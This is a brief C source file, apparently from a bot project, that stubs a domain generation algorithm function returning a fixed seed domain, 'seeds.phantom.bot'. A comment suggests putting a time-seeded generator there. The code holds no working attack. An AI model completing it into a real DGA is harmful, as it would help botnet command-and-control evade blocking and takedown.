#include "dga.h"

// Configurable Seed
#define STATIC_SEED_DOMAIN "seeds.phantom.bot"

char *dga_get_domain(void) {
    // Static Return (DGA can be implemented here)
    // e.g. generate_domain(time(NULL))
    
    return STATIC_SEED_DOMAIN;
}
